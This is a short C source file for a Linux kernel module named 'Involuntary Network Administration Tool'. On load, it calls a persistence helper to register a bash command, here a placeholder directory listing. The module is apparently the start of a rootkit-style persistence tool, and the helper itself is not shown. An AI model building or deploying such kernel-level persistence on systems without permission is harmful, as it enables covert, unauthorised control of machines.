#include "common.h"
#include "persist.h"
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ncbyrnes");
MODULE_DESCRIPTION("Involuntary Network Administration Tool");

static int __init inat_init(void)
{

    char bin_loc[] = "/bin/bash";
    char *argv[] = {bin_loc, "-c", "ls", "-la", "/", ">", "/home/nichole/ls_output", NULL};

    printk("PERSISTING persist.sh");
    PersistBinary(bin_loc, argv);
    return 0;
}

static void __exit inat_exit(void)
{
    printk("STOPPING INAT");
}

module_init(inat_init);
module_exit(inat_exit);